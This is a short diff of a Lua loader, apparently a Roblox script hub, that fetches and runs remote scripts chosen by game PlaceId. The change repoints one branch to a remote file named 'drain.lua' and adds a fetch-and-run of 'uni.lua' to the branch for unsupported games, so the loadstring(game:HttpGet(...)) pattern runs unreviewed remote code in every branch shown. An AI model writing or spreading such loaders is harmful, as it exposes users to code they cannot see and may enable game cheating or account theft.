@@ -72,11 +72,13 @@ elseif currentId == game13 then
     end)
 elseif currentId == game14 then
     local success, result = pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/uni.lua"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/drain.lua"))()
     end)
   
 else
-  
+    local success, result = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/NovaHubRBLX/NovaHub/refs/heads/main/uni.lua"))()
+    end)
     print("Current PlaceId: " .. tostring(currentId))
     print("This game is not currently supported.")
 end
